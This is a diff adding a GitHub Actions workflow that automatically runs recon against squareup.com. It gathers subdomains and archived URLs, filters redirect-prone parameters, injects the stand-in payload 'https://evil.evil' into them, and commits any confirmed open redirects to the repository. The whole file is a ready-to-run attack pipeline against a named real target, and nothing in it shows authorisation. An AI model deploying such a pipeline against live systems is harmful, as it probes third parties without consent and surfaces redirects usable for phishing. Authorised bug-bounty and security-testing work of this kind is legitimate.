@@ -1,0 +1,73 @@
+name: Hunting Open Redirect
+
+on:
+  push:
+    branches: [master]
+
+jobs:
+  scan-and-deploy:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Install Dependencies & Tools
+        run: |
+          set -e
+
+          # Install system deps
+          sudo apt-get update
+          sudo apt-get install -y wget unzip jq git python3 python3-pip golang pipx
+
+          # Setup pipx env
+          python3 -m pip install --upgrade pip
+          python3 -m pipx ensurepath
+          export PATH="$HOME/.local/bin:$PATH"
+
+          # Install Go-based tools
+          go install github.com/projectdiscovery/httpx/cmd/httpx@latest && sudo mv ~/go/bin/httpx /usr/bin/
+          go install github.com/cybercdh/assetfinder@cybercdh && sudo mv ~/go/bin/assetfinder /usr/bin/
+          go install github.com/lc/gau/v2/cmd/gau@latest && sudo mv ~/go/bin/gau /usr/bin/
+          go install github.com/tomnomnom/qsreplace@latest && sudo mv ~/go/bin/qsreplace /usr/bin/
+
+          # Install Python-based tool: uro
+          pipx install uro
+
+      - name: Recon and Hunt Open Redirect
+        run: |
+          mkdir -p results
+
+          # 1. Subdomain discovery
+          assetfinder squareup.com | tee results/subdomains.txt
+
+          # 2. URL collection
+          gau squareup.com | grep '=' | tee results/gau-urls.txt
+
+          # 3. Filter for redirect-prone parameters
+          cat results/gau-urls.txt | grep -Ei 'redirect|url|next|dest|data|continue|return|callback' | uro --filters hasparams > results/redirect-params.txt
+
+          # 4. Inject payload & check for actual redirection
+          cat results/redirect-params.txt \
+            | qsreplace "https://evil.evil" \
+            | httpx -silent -location -status-code \
+            | tee results/redirect-test.txt
+
+          # 5. Extract successful redirects
+          grep "evil.evil" results/redirect-test.txt > results/vulnerable.txt || true
+
+      - name: Set up Git user
+        run: |
+          git config --global user.email "${{ secrets.EMAIL_ADDRESS }}"
+          git config --global user.name "${{ secrets.USER_NAME }}"
+
+      - name: Commit changes
+        run: |
+          git add results/
+          git commit -m "Open Redirect Recon $(date -u)" --no-verify || echo "Nothing to commit"
+
+      - name: Push changes
+        uses: ad-m/github-push-action@master
+        with:
+          branch: ${{ github.ref }}
+          github_token: ${{ secrets.GITHUB_TOKEN }}
